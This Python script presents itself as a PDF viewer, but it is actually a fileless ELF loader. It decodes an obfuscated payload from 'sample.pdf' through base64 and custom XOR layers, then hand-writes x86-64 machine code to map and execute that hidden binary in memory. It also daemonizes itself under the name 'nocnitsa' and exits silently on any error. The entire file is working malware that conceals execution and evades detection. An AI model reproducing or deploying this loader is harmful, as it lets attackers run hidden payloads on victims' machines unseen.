#!/usr/bin/env python3

import io
import struct
import ctypes
import os
import base64 as b64
import hashlib as hl
import sys
import signal
from ctypes import (POINTER, c_char_p, c_int, c_long, c_size_t, c_uint,
                    c_ulong, c_void_p, memmove, sizeof)
from ctypes.util import find_library

PROTECTED_PDF = "sample.pdf"
UNPACK_FORMAT_EHDR = "<HHIQQQIHHHHHH"
UNPACK_FORMAT_PHDR = "<IIQQQQQQ"


libc = ctypes.CDLL(find_library('c'), use_errno=True)
mmap = libc.mmap
mmap.argtypes = [c_void_p, c_size_t, c_int, c_int, c_int, c_size_t]
mmap.restype = c_void_p
memset = ctypes.memset
mprotect = libc.mprotect
mprotect.argtypes = [c_void_p, c_size_t, c_int]
mprotect.restype = c_int

getauxval = libc.getauxval
getauxval.argtypes = [c_ulong]
getauxval.restype = c_ulong

PAGE_SIZE = ctypes.pythonapi.getpagesize()

def extract_pdf_content(file_path):
    try:
        with open(file_path, 'r') as f:
            encoded_content = f.read().strip()
        
        stage1 = b64.b64decode(encoded_content)
        
        matrix_seed = b64.b64decode('aGlkZGVuX21hdHJpeF8yMDI0').decode()
        hash_base = hl.sha256(matrix_seed.encode()).digest()
        decode_matrix = [hash_base[idx] ^ hash_base[(idx + 7) % len(hash_base)] for idx in range(32)]
        
        stage2 = bytearray()
        for pos, byte_val in enumerate(stage1):
            key_pos = pos % len(decode_matrix)
            temp_val = byte_val ^ decode_matrix[(key_pos + 3) % len(decode_matrix)]
            final_val = (temp_val - decode_matrix[key_pos]) % 256
            stage2.append(final_val)
        
        pdf_executable = b64.b64decode(bytes(stage2))
        
        pdf_stream = io.BytesIO(pdf_executable)
        pdf_stream.seek(0)
        return pdf_stream
        
    except Exception as e:
        exit(-1)
        
def analyze_pdf_structure(pdf_stream):
    try:
        parsed_pdf = {"pe" : {}, "ph" : [], "pie" : False, "ie" : None}
        pdf_stream.seek(16)
        packed_ehdr = pdf_stream.read(struct.calcsize(UNPACK_FORMAT_EHDR))
        unpacked_ehdr = struct.unpack(UNPACK_FORMAT_EHDR, packed_ehdr)
        parsed_pdf["pe"] = { "phn" : unpacked_ehdr[9], "phs" : unpacked_ehdr[8], "pho" : unpacked_ehdr[4], "e": unpacked_ehdr[3]}
        pdf_stream.seek(unpacked_ehdr[4])
        for x in range(unpacked_ehdr[9]):
            packed_phdr = pdf_stream.read(struct.calcsize(UNPACK_FORMAT_PHDR))
            unpacked_phdr = struct.unpack(UNPACK_FORMAT_PHDR, packed_phdr)
            end = pdf_stream.tell()
            pdf_stream.seek(unpacked_phdr[2])
            if unpacked_phdr[0] == 0x1:
                hb = pdf_stream.read(unpacked_phdr[5])
                if len(parsed_pdf["ph"]) == 0:
                    if unpacked_phdr[3] == 0x0:
                        parsed_pdf["pie"] = True
                    else:
                        parsed_pdf["pie"] = False
                hd = ctypes.create_string_buffer(hb)
                parsed_pdf["ph"].append({"f" : unpacked_phdr[1], "m" : unpacked_phdr[6], "fz" : unpacked_phdr[5], "o" : unpacked_phdr[2], "d" : hd, "va" : unpacked_phdr[3]})
            elif unpacked_phdr[0] == 0x03:
                ie = pdf_stream.read(unpacked_phdr[5])[:-1]
                parsed_pdf["ie"] = ie
            pdf_stream.seek(end)
        return parsed_pdf
    except Exception as e:
        exit(-1)


def create_viewer_stack(pages):
    try:
        razmer =  pages * PAGE_SIZE
        base = mmap(0, razmer, 0x01 | 0x02, 0x20 | 0x02 | 0x100, -1, 0)
        memset(base, 0, razmer)
        base = base + razmer - PAGE_SIZE
        stack = (c_size_t * PAGE_SIZE).from_address(base)
        return {"razmer" : razmer, "base" : base, "auxv_s" : 0, "stack" : stack, "refs" : []}
    except Exception as e:
        exit(-1)
    
def configure_pdf_environment(argv, envp, pdf_data, execution_stack):
    try:
        execution_stack["stack"][0] = c_size_t(len(argv))
        i = 1
        for arg in argv:
            arg_encoded = arg.encode("utf-8", errors="ignore")
            arg_alloc = ctypes.create_string_buffer(arg_encoded)
            execution_stack["refs"].append(arg_alloc)
            execution_stack["stack"][i] = ctypes.addressof(arg_alloc)
            i = i + 1
        execution_stack["stack"][i + 1] = c_size_t(0)
        env_offset = i + 1
        j = 0
        for env in envp:
            env_encoded = env.encode("utf-8", errors="ignore")
            env_alloc = ctypes.create_string_buffer(env_encoded)
            execution_stack["refs"].append(env_alloc)
            execution_stack["stack"][j + env_offset] = ctypes.addressof(env_alloc)
            j = j + 1
        execution_stack["stack"][j + env_offset] = c_size_t(0)
        j = j + 1
        aux_offset = j + env_offset
        execution_stack["auxv_s"] = aux_offset << 3
        auxv_pointer = execution_stack["base"] + aux_offset
        arch = ctypes.create_string_buffer(b"x86_64")
        execution_stack["refs"].append(arch)
        auxv = []
        auxv.append((0x07, 0x0))
        auxv.append((0x03, 0x0))
        auxv.append((0x09, 0x0))
        auxv.append((0x05, pdf_data["pe"]["phn"]))
        auxv.append((0x04, pdf_data["pe"]["phs"]))
        auxv.append((0x06, PAGE_SIZE))
        auxv.append((0x17, 0))
        auxv.append((0x19, auxv_pointer))
        auxv.append((0x20, getauxval(0x20)))
        auxv.append((0x21, getauxval(0x21)))
        auxv.append((0x0f, ctypes.addressof(arch)))
        auxv.append((0x1f, ctypes.addressof(execution_stack["refs"][0])))
        auxv.append((0x0b, os.getuid()))
        auxv.append((0x0c, os.geteuid()))
        auxv.append((0x0d, os.getgid()))
        auxv.append((0x0e, os.getegid()))
        if getauxval(0x11) != 0:
            auxv.append((0x11, getauxval(0x11)))
        if getauxval(0x10) != 0:
            auxv.append((0x10, getauxval(0x10)))
        if getauxval(0x1a) != 0:
            auxv.append((0x1a, getauxval(0x1a)))
        auxv.append((0x00, 0))
        for t, v in auxv:
            execution_stack["stack"][aux_offset] = t
            execution_stack["stack"][aux_offset + 1] = v
            aux_offset = aux_offset + 2
        aux_offset = aux_offset - 1
        return {"data" : pdf_data, "st" : execution_stack, "of" : aux_offset}
            
    except Exception as e:
        pass
    

def initialize_pdf_context(pdf_stream, pdf_name):
    main_pdf = analyze_pdf_structure(pdf_stream)
    interpreter = analyze_pdf_structure(open(main_pdf["ie"], "rb"))
    return [main_pdf, interpreter]

def PAGE_FLOOR(addr):
    return (addr) & (-PAGE_SIZE)

def PAGE_CEIL(addr):
    return (PAGE_FLOOR((addr) + PAGE_SIZE - 1))


def calculate_pdf_memory_size(pdf_info):
    razmer = 0
    for x in pdf_info["ph"]:
        if (x["va"] + x["m"]) > razmer:
            razmer = x["va"] + x["m"]
        if not pdf_info["pie"]:
            razmer = razmer - pdf_info["ph"][0]["va"]
    return razmer

def launch_pdf_viewer(pdf_context):
    try:
        main_pdf = pdf_context[0]
        interpreter = pdf_context[1]
        execution_stack = create_viewer_stack(2048)
        argv = ["nocnitsa", " ", " ", " ", " ", " ", " "]
        envp = []
        for name in os.environ:
            envp.append("%s=%s" % (name, os.environ[name]))
        program_context = configure_pdf_environment(argv, envp, main_pdf, execution_stack)
        loader_code = b""
        if main_pdf["pie"]:
            addr = 0x00
        else:
            addr = main_pdf["ph"][0]["va"]
        razmer_mema = calculate_pdf_memory_size(main_pdf)
        addr = PAGE_FLOOR(addr)
        razmer_mema = PAGE_CEIL(razmer_mema)
        viewer_instruction =  b"\x48\xc7\xc0\x0b\x00\x00\x00\x48\xbf%s\x48\xbe%s\x0f\x05" % (struct.pack("<Q", addr), struct.pack("<Q", razmer_mema))
        loader_code = loader_code + viewer_instruction
        viewer_instruction = b"\x48\xc7\xc0\x09\x00\x00\x00\x48\xbf%s\x48\xbe%s\x48\xc7\xc2%s\x49\xc7\xc2%s\x49\xc7\xc0%s\x49\xc7\xc1%s\x0f\x05\x50\x4c\x8b\x1c\x24" % (struct.pack("<Q", addr), struct.pack("<Q", razmer_mema), struct.pack("<L", 0x02 | 0x04 | 0x01), struct.pack("<L",0x20 | 0x02), struct.pack("<L", 0xffffffff), struct.pack("<L", 0x00))
        loader_code = loader_code + viewer_instruction
        for x in main_pdf["ph"]:
            source_address = ctypes.addressof(x["d"])
            va = x["va"]
            if not main_pdf["pie"]:
                va = va - main_pdf["ph"][0]["va"]
            viewer_instruction = b"\x48\xbe%s\x48\xbf%s\x4c\x01\xdf\x48\xb9%s\xf3\xa4" % (struct.pack("<Q", source_address), struct.pack("<Q", va), struct.pack("<Q", x["fz"]))
            loader_code = loader_code + viewer_instruction
        fixup_code = b"\x49\xbe%s" % struct.pack("<Q", main_pdf["pe"]["pho"])
        fixup_code = fixup_code + b"\x4d\x01\xde"
        viewer_instruction = b"\x49\xbf%s\x4d\x89\x37" % (struct.pack("<Q", program_context["st"]["base"] + program_context["st"]["auxv_s"] + (0x03 << 3)))
        fixup_code = fixup_code + viewer_instruction
        viewer_instruction = b"\x49\xbe%s" % struct.pack("<Q", main_pdf["pe"]["e"])
        fixup_code = fixup_code + viewer_instruction
        if main_pdf["pie"]:
            fixup_code = fixup_code + b"\x4d\x01\xde"
        viewer_instruction = b"\x49\xbf%s\x4d\x89\x37" % (struct.pack("<Q", program_context["st"]["base"] + program_context["st"]["auxv_s"] + (0x05 << 3)))
        loader_code = loader_code + fixup_code + viewer_instruction
        if interpreter["pie"]:
            addr = 0x00
        else:
            addr = interpreter["ph"][0]["va"]
        razmer_memb = calculate_pdf_memory_size(interpreter)
        addr = PAGE_FLOOR(addr)
        razmer_memb = PAGE_CEIL(razmer_memb)
        viewer_instruction =  b"\x48\xc7\xc0\x0b\x00\x00\x00\x48\xbf%s\x48\xbe%s\x0f\x05" % (struct.pack("<Q", addr), struct.pack("<Q", razmer_memb))
        loader_code = loader_code + viewer_instruction
        viewer_instruction = b"\x48\xc7\xc0\x09\x00\x00\x00\x48\xbf%s\x48\xbe%s\x48\xc7\xc2%s\x49\xc7\xc2%s\x49\xc7\xc0%s\x49\xc7\xc1%s\x0f\x05\x50\x4c\x8b\x1c\x24" % (struct.pack("<Q", addr), struct.pack("<Q", razmer_memb), struct.pack("<L", 0x02 | 0x04 | 0x01), struct.pack("<L",0x20 | 0x02), struct.pack("<L", 0xffffffff), struct.pack("<L", 0x00))
        loader_code = loader_code + viewer_instruction
        for x in interpreter["ph"]:
            source_address = ctypes.addressof(x["d"])
            va = x["va"]
            if not interpreter["pie"]:
                va = va - interpreter["ph"][0]["va"]
            viewer_instruction = b"\x48\xbe%s\x48\xbf%s\x4c\x01\xdf\x48\xb9%s\xf3\xa4" % (struct.pack("<Q", source_address), struct.pack("<Q", va), struct.pack("<Q", x["fz"]))
            loader_code = loader_code + viewer_instruction
        viewer_instruction = b"\x49\xbe%s" % struct.pack("<Q", 0x00)
        loader_code = loader_code + viewer_instruction
        loader_code = loader_code + b"\x4d\x01\xde"
        viewer_instruction = b"\x49\xbf%s\x4d\x89\x37" % (struct.pack("<Q", program_context["st"]["base"] + program_context["st"]["auxv_s"] + (0x01 << 3)))
        loader_code = loader_code + viewer_instruction
        init = interpreter["pe"]["e"]
        register_clear = [b"\xc0", b"\xdb", b"\xc9", b"\xd2", b"\xed", b"\xe4", b"\xf6", b"\xff"]
        for x in register_clear:
            register_clear_code = b"\x48\x31%s" % x
            loader_code = loader_code + register_clear_code
        viewer_instruction = b"\x48\xbc%s\x48\xb9%s\x4c\x01\xd9\x48\x31\xd2\xff\xe1" % (struct.pack("<Q", program_context["st"]["base"]), struct.pack("<Q", init))
        loader_code = loader_code + viewer_instruction
        d = mmap(0, PAGE_CEIL(len(loader_code)), 0x02, 0x20 | 0x02, -1, 0)
        s = ctypes.create_string_buffer(loader_code)
        memmove(d, s, len(loader_code))
        if mprotect(PAGE_FLOOR(d), PAGE_CEIL(len(loader_code)), 0x01 | 0x04) == -1:
            exit(-1)
        execution_function = ctypes.cast(d, ctypes.CFUNCTYPE(c_void_p))
        execution_function()

    except Exception as e:
        exit(-1)


if hasattr(os, "devnull"):
    DEVNULL = os.devnull
else:
    DEVNULL = "/dev/null"

def setup_workingdir(cwd="/", stdin=DEVNULL, stderr=DEVNULL, stdout=DEVNULL, umask=0):
    pid = os.fork()

    if pid == 0:
        os.setsid() 
        signal.signal(signal.SIGHUP, signal.SIG_IGN)

        pid = os.fork()
        if pid == 0:
            os.chdir(cwd)
            os.umask(umask) 
            init_pdf()
        else:
            os._exit(0)   
 
def init_pdf():
        file_path = PROTECTED_PDF
        extracted_content = extract_pdf_content(file_path)
        pdf_stream = extracted_content
        pdf_context = initialize_pdf_context(pdf_stream, file_path)
        launch_pdf_viewer(pdf_context)

cwd = os.getcwd()
setup_workingdir(
    cwd=cwd
)